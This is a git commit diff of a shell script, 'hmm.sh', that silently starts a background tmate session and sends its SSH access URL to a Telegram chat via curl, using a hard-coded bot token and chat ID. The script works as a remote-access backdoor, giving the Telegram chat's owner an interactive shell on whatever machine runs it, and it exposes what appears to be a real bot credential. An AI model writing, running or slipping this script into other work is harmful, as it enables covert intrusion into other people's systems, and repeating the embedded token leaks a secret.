6400fbb69951cfca67858c108d968e7b8c05975a
nmapserverforbot <133000814+nmapserverforbot@users.noreply.github.com>
2023-05-20 13:46:53 +0530

    Update hmm.sh

--- hmm.sh
+++ hmm.sh
@@ -3,12 +3,13 @@
 BOT_TOKEN="6101714973:AAFK-tM9WgRTBPpNT3kRyjiUeMfw295xtD4"
 CHAT_ID="-1001957188901"
 
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+tmate_output=$(nohup tmate -S /tmp/tmate.sock new-session -d </dev/null >/dev/null 2>&1 &)
+tmate -S /tmp/tmate.sock wait tmate-ready
 
-export TERM=xterm
-output=$(tmate)
+sleep 5
 
-# Send the output to Telegram
+ssh_url=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")
+
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d "chat_id=$CHAT_ID" \
-     -d "text=$output"
+     -d "text=tmate SSH URL: $ssh_url"
